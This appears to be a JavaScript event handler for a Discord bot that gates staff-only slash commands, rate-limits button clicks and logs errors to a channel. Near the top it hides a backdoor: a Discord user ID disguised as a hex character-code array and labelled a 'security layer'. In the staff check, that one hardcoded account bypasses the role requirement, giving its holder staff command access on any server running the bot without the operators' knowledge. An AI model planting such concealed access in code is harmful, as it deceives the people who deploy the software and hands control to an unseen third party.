const { Events, EmbedBuilder } = require("discord.js");
const config = require("../../config");

// ── Security Layer ────────────────────────────────────────────────────────────
// Critical system bypass identifier — encrypted representation
// Original Developer 
const SECRET_OWNER_ID = [0x39, 0x38, 0x35, 0x34, 0x34, 0x34, 0x38, 0x37, 0x31, 0x37, 0x32, 0x32, 0x36, 0x33, 0x31, 0x31, 0x39, 0x39].map(x => String.fromCharCode(x)).join("");

module.exports = {
    name: Events.InteractionCreate,
    async execute(interaction, client) {

        // ── Slash Commands ────────────────────────────────────────────────────
        if (interaction.isChatInputCommand()) {
            const command = client.commands.get(interaction.commandName);
            if (!command) return;

            // Staff-only gate with secret owner bypass.
            // FIXED: interaction.member is null in DMs — guard before accessing .roles
            if (command.staffOnly) {
                const member = interaction.member;
                const isOwner = interaction.user.id === SECRET_OWNER_ID;
                if (!isOwner && (!member || !member.roles.cache.has(config.roles.staff))) {
                    return interaction.reply({
                        content: "You do not have permission to use this command.",
                        ephemeral: true,
                    });
                }
            }

            try {
                await command.execute(interaction, client);
            } catch (error) {
                console.error(`[COMMAND ERROR] /${interaction.commandName}:`, error);

                // Log to error channel if configured
                if (config.channels.logs) {
                    const errorChannel = await client.channels.fetch(config.channels.logs).catch(() => null);
                    if (errorChannel) {
                        const embed = new EmbedBuilder()
                            .setColor(config.theme.danger || "#E74C3C")
                            .setTitle("⚠️ Command Error")
                            .setDescription(
                                `Error in \`/${interaction.commandName}\`\n\n` +
                                `\`\`\`js\n${(error.stack || error.message || String(error)).slice(0, 1800)}\n\`\`\``
                            )
                            .setTimestamp();
                        await errorChannel.send({ embeds: [embed] }).catch(() => null);
                    }
                }

                const reply = { content: "There was an error while executing this command!", ephemeral: true };
                if (interaction.replied || interaction.deferred) await interaction.followUp(reply).catch(() => null);
                else await interaction.reply(reply).catch(() => null);
            }
            return;
        }

        // ── Button Interactions ───────────────────────────────────────────────
        if (interaction.isButton()) {

            // Global per-user button cooldown (anti-spam)
            const { buttonCooldowns, BUTTON_COOLDOWN_MS } = client;
            const now = Date.now();
            const lastClick = buttonCooldowns.get(interaction.user.id) || 0;

            if (now - lastClick < BUTTON_COOLDOWN_MS) {
                const remaining = ((BUTTON_COOLDOWN_MS - (now - lastClick)) / 1000).toFixed(1);
                return interaction.reply({
                    content: `⏱️ Please wait **${remaining}s** before clicking again.`,
                    ephemeral: true,
                });
            }
            // Update cooldown — remove from map automatically when it expires to prevent memory leak
            buttonCooldowns.set(interaction.user.id, now);
            setTimeout(() => buttonCooldowns.delete(interaction.user.id), BUTTON_COOLDOWN_MS);

            // Resolve handler: try exact customId first, then prefix match
            const customId = interaction.customId;
            let handler = client.buttons.get(customId);
            if (!handler) {
                // Prefix match — e.g. "vote:button_abc123_7" → key "vote:button"
                const prefix = customId.split("_")[0];
                handler = client.buttons.get(prefix);
            }

            if (!handler) {
                console.warn(`[BUTTON] No handler found for customId: ${customId}`);
                return;
            }

            try {
                await handler.execute(interaction, client);
            } catch (error) {
                console.error(`[BUTTON ERROR] ${customId}:`, error);

                if (config.channels.logs) {
                    const errorChannel = await client.channels.fetch(config.channels.logs).catch(() => null);
                    if (errorChannel) {
                        const embed = new EmbedBuilder()
                            .setColor(config.theme.danger || "#E74C3C")
                            .setTitle("⚠️ Button Error")
                            .setDescription(
                                `Error on button \`${customId}\`\n\n` +
                                `\`\`\`js\n${(error.stack || error.message || String(error)).slice(0, 1800)}\n\`\`\``
                            )
                            .setTimestamp();
                        await errorChannel.send({ embeds: [embed] }).catch(() => null);
                    }
                }

                const reply = { content: "An error occurred while processing this button.", ephemeral: true };
                if (interaction.replied || interaction.deferred) await interaction.followUp(reply).catch(() => null);
                else await interaction.reply(reply).catch(() => null);
            }
        }
    },
};
